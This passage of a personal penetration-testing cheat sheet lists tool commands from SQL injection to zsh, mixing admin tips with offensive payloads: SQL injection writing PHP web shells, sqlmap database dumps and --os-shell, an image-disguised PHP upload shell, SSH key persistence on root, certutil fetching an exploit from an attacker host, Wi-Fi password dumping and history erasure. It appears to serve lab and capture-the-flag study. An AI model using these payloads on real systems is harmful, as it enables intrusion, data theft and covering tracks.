- into outfile: `SELECT “<?php system($_GET['cmd']); ?>” into outfile “/var/www/WEBROOT/backups”`
- command and code execution: (http)
    - `http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:\Windows\System32\drivers\etc\hosts)'`
    - `http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']); ?>)" INTO OUTFILE 'c:/xampp/htdocs/backdoor.php'` and then: `http://10.10.10.10/backdoor.php?cmd=ipconfig`

## sqlmap

One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.

- `sqlmap -u http://sqli.site/view.php -D <db_name> -T <table_name ex: users> -C <username.password> --dump`
- `sqlmap -u http://sqli.view.php -D <db_name> -T <table_name> --dump-all`
- `sqlmap -u http://sqli.view.php?id=1 --users`
- `sqlmap -u http://sqli.view.php?id=1 --tor --tor-type=SOCKS5`
- `sqlmap -u http://sqli.view.php?id=1 --dbs`
- `sqlmap -u http://sqli.view.php -D <db_name> --tables`

Using the session cookies and sqlmap: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

If the target is vulnerable for the get request (see above) we can get a shell out of it: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`

## SSH

- removing credentials from known_hosts for SSH : `ssh-keygen -f "/home/user/.ssh/known_hosts" -R "[<IP>]:<PORT>"`
- SSH fingerprint `ssh-keygen -l -f id_rsa`
- exporting public key from private key: `ssh-keygen -f <private_key> -y > exported-pub-key.pub`
- connecting with SSH key: first make a key pair on kali: `ssh-keygen` then create the authorized-keys on the target machine: `mkdir /root/.ssh` and echo the public key there: `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" >> /root/.ssh/authorized_keys` now we can SSH in to the target system from kali
- connection timeout set: `ssh -o ConnectTimeout=10 gibson@10.11.1.71`
- ALWAYS CHECK: `cat etc/ssh/sshd_config | uniq`
- or (if you don't have a config file create one, nano does that automatically for you)
- `nano ~/.ssh/config`
- Adding SSH key permanently to the SSH config file

```
Host github.com
	User git
	IdentityFile ~/.ssh/githubkey

```

- testing for the connection `ssh -T git@github.com`

*This section is under development*

## steghide

Added for fun :) extract a file form a picture.

- `steghide extract -sf <picutre.jpg>`

## sublist3r

A great tool for subdomain enumeration.

- `sublist3r -d <website.com> -t 50`
- it has a built in brute force module: `sublist3r -d <domain> -b` which will use a built in list that can be found here: `/usr/share/sublist3r/subrute/names.txt`

## sudo update & upgrade

- If you wish to upgrade only a certain package, ex: Firefox:
    - `sudp apt-get update && sudo apt-get --only-upgrade firefox`
- If you wish to list upgradable packages use `sudo apt list --upgradable`

## tar

No big deal here, just had to remember the how to extract a .tar.gz package so I saved it here for reference.

- `tar -xvf <somefile.tar.gz>`

## theharwester

For subdomain enumeration.

`theharvester -d <domain.com> -l 500 -b google` where `-l` is to for how deep to go and `-b` is for the search engine.

## to upgrade a shell on the target machine

Some shells are fuzzy but after an upgrade you can have a proper one with all the normal shell functions like TAB, etc...

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm`
3. here you want to press `CTRL+z` to background your session
4. `stty raw -echo; fg` I like to add `fg` here to bring the session to the foreground again and don't have to do it as a next command

## tr

- to organize vertical output to horizontal by cutting out the new lines `cat <file_name> | tr -d '\n'`

## tmux

- new session `tmux new -s <session name>`
- recursively search throug history `CTRL + R` and start typing
- default prefix key is `CTRL + B`
- new window `prefix + c`
- switch between tabs `prefix + <tab number>`
- list sessions `tmux ls`
- attach session `tmux attach -t <session name>`
- switching back to prev session `CTR + A + 1`
- detach session `prefix d`
- rename tab `prefix`
- join pane from window `prefix j <window number>'`
- send pane to window `prefix s <pane number>`
- config `nano ~/.tmux.conf` no default config file, you have to create one, can use a sample file if needed: `/usr/share/doc/tmux/examples`
- logging `prefix ALT SHIFT P`
- for the copy/paste to work don't forget to install xclip if you don't have it: `sudo apt update && sudo apt install xclip`
- working example .tmux.conf file by ippsec:

```
#reload the config file if needed
unbind r
bind r source-file ~/.tmux.conf \; display "Reloaded ~/.tmux.conf"

#enabling the mouse
set -g mouse on

# Remap prefix to screens
set -g prefix C-a
bind C-a send-prefix
unbind C-b

# Quality of life stuff
set -g history-limit 10000
set -g allow-rename off

## Join windows
bind-key j command-prompt -p "join pane from:"  "join-pane -s '%%'"
bind-key s command-prompt -p "send pane to:"  "join-pane -t '%%'"

# Search Mode VI (default is emac)
set-window-option -g mode-keys vi

#clone github repo to ~ from:
#https://github.com/tmux-plugins/tmux-logging
run-shell ~/tmux-logging/logging.tmux

# Selection with mouse should copy to clipboard right away, in addition to the default action.
unbind -n -Tcopy-mode-vi MouseDragEnd1Pane
bind -Tcopy-mode-vi MouseDragEnd1Pane send -X copy-selection-and-cancel\; run "tmux save-buffer - | xclip -i -sel clipboard > /dev/null"

# Middle click to paste from the clipboard
unbind-key MouseDown2Pane
bind-key -n MouseDown2Pane run "tmux set-buffer \"$(xclip -o -sel clipboard)\"; tmux paste-buffer"

```

## tmux logging

- **[See tmux-logging repo](https://github.com/encryptedninja/tmux-logging)**

## Two default gateways on One System - 2 interfaces

- source: [thomas-krenn.com](https://www.thomas-krenn.com/en/wiki/Two_Default_Gateways_on_One_System)
- We will assume that we have two interfaces: eth0 and eth1. The two networks that should be used are 192.168.0.0/24 and 10.10.0.0/24, whereby the first IP address in each respective network should be the gateway. Under Debian, the initial configuration would appear as follows. `/etc/network/interfaces`

```
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).
# The loopback network interface

auto lo
iface lo inet loopback

# The primary network interface

allow-hotplug eth0
iface eth0 inet static
    address 192.168.0.10
    netmask 255.255.255.0
    gateway 192.168.0.1

# The secondary network interface
allow-hotplug eth1
iface eth1 inet static
    address 10.10.0.10
    netmask 255.255.255.0

```

- To add a new routing table, the file, `/etc/iproute2/rt_tables` must be edited. We will call the routing table “rt2” and set its preference to 1. The named file should then appear as follows.

```
#
# reserved values
#
255     local
254     main
253     default
0       unspec
#
# local
#
#1      inr.ruhep
1 rt2

```

- Configuring the New Routing Table: From this point, four commands are needed to achieve our goal. First, the new routing table needs to be populated, which is done using the following command.

```
ip route add 10.10.0.0/24 dev eth1 src 10.10.0.10 table rt2
ip route add default via 10.10.0.1 dev eth1 table rt2

```

- The first command says that the network, 10.10.0.0/24, can be reached through the eth1 interface. The second command sets the default gateway.
- Routing Rules: So that the system knows when to use our new routing table, two rules must be configured.

```
ip rule add from 10.10.0.10/32 table rt2
ip rule add to 10.10.0.10/32 table rt2

```

- These rules say that both traffic from the IP address, 10.10.0.10, as well as traffic directed to or through this IP address, should use the rt2 routing table.
- Making the Configuration permanent: The IP rule and IP route commands will become invalid after a re-boot, for which reason they should become part of a script (for example, /etc/rc.local) that will be executed once the network has been started after booting. For Debian, these command can also be written directly into the /etc/network/interfaces file, which would then appear as follows.

```
iface eth1 inet static
    address 10.10.0.10
    netmask 255.255.255.0
    post-up ip route add 10.10.0.0/24 dev eth1 src 10.10.0.10 table rt2
    post-up ip route add default via 10.10.0.1 dev eth1 table rt2
    post-up ip rule add from 10.10.0.10/32 table rt2
    post-up ip rule add to 10.10.0.10/32 table rt2

```

- More than Two Network Cards or Gateways: If there are more than two networks, a routing table can be created for each additional network analogous to the example presented above.
- Testing the Configuration: The following commands can be used to ensure that the rules as well as the routing entries are working as expected.

```
ip route list table rt2
ip rule show

```

## unfurl for searching for login forms

- `cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent`

## Upload file type bypass

- Upload image:

```
GIF89a1
<?php system($_POST['cmd']); ?>

```

## virtualbox

- Need this config to be able to make VirtualBox work with both bridged and NAT at the same time.
    - `sudo nano /etc/network/interfaces`
    - edit the file: `allow-hotplug eth1` uncomment it
    - edit the file: `iface eth1 inet dhcp` uncomment it
    - save the changes, exit nano then: `sudo ifup eth1` to apply the changes on the running system.
- install ***virtualbox-guest***:
- it has to be installed on the VM: `sudo apt update && sudo apt install -y --reinstall virtualbox-guest-x11 && sudo reboot -f`

## Wifi show clear text password (Win)

- `netsh show profile "wifi network name" key=clear`
- Also we can save the above info into a file: `for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> wifipassword.txt`

## wfuzz

Enlists subdomains based on a wordlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.

- `wfuzz -c -f sub-fighter -w top5000.txt -u http://<domain> -H "HOST: Fuzz.domain.com" --hw 290`

## wireless adapter (TP-LINK WN722N version 2,3,4) monitor mode

- `apt install -y realtek-rtl8188eus-dkms`
- `reboot -f`
- `iwconfig` - check driver it is Realter 8188
- `wifite --kill` - now monitor mode is enabled and working

## Windows file transfer

In case you have to bring a file over to the compromised Win machine. The last piece of information is how do you want to name the file you bring over.

- `certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe`

## Windows hide zip file as picture

- zip up files first (nc_secrets.zip)
- use photo to hide files in (cover.jpg)
- name you new secret photo (secretphoto.jpg)
- `copy /b cover.jpg+nc_secrets.zip secretphoto.jpg`
- to encrypt files in the folder (in case someone finds it), go to your nc_secrets folder and: `cipher /E` before executing above commands

## Windows commands history check

It's just like bash history in Linux.

- `c:\Users\<username>\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` this line opens up a notepad with the histroy of commands.

## VMWare
* **Shrinking .ova file size before export:**
	* `sudo e4defrag /`
 	* `dd if=/dev/zero of=wipefile bs=1M; sync; /bin/rm wipefile`
  	* `sudo vmware-toolbox-cmd disk shrinkonly`    
* **Fixing after kernel update on Linux Debian:**
	- First clone this repo with `git clone` : `https://github.com/mkubecek/vmware-host-modules` and run within the main directory: `git checkout workstation-16.2.3` and `sudo make` and finally: `sudo make install`
	- `openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subc "/CN=VMWARE/"`
	- `sudo /usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmmon)`
	- `sudo /usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmnet)`
	- `tail $(modinfo -n vmmon) | grep "Module signature appended"`
	- `sudo mokutil --import MOK.der`
	- `-- reboot ---`
	- `mokutil --test-key MOK.der`
	- UPDATE KEY: `sudo update-secureboot-policy --enroll-key`

* **VMWare expanding disk (Linux)**
	- Expand the disk space in VMWare and then follow instructions **[here](https://cybersalih.com/how-to-expand-disk-space-on-kali-linux-vmware/)** to read or **[here](https://www.youtube.com/watch?v=NwpzYlfKnrY)** to watch a quick video about it.

## wireguard

* generate private / public key on client in /etc/wireguard: `wg genkey | tee private.key | wg pubkey > public.key`
* create client configuration file `nano /etc/wireguard/wg0.conf`:

```
[Interface]
PrivateKey = <contents-of-your-private-key-file>
Address = 10.0.0.2/24 (Replace with a desired IP address in the server's allowed range)

# Optional: Configure routing for traffic through the VPN
# PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

ListenPort = 51820 (Change if needed, avoid common port conflicts)

[Peer]
PublicKey = <server's public key>
Endpoint = <server's public IP address>:51820 (Replace with the server's IP and port)
AllowedIPs = 0.0.0.0/0 (Allow all traffic through the tunnel, adjust for specific needs)
```
* on server: `wg set wg0 peer <peer's pub key> allowed-ips <client's tunnel interface>`
## wpscan

The best scanner for WordPress sites.

- `wpscan --url http://<domain.com> -e u` to enumerate users
- once we found some users we save their names in a file called *users.txt*
- then we use a wordlist to find vulnerable passwords on found users: `wpscan -U /dev/shm/users.txt -P /usr/share/wordlist/fasttrack.txt --url http://<domain.com>`

## xfreerdp to RDP in onto a host

- `xfreerdp /u:administrator /p:letmein123! /v:<IP> /size:90&`

## zip2john

Prepping a zip file for using it with *john*.

- `zip2john <zipfile name> > <output file name>`

With the same fashion there's ***pdf2john*** as well with a very similar synthax.

## zsh

***Erase history*** when using ***zsh*** for example from bash, create a function and then call it:

1. `function erase_history { local HISTSIZE=0; }`
2. `erase_history`

---

### This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses switches, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.

### The world is at your fingertips 💯

![003_hacker_hoodie](/images/003_hacker_hoodie.jpg)
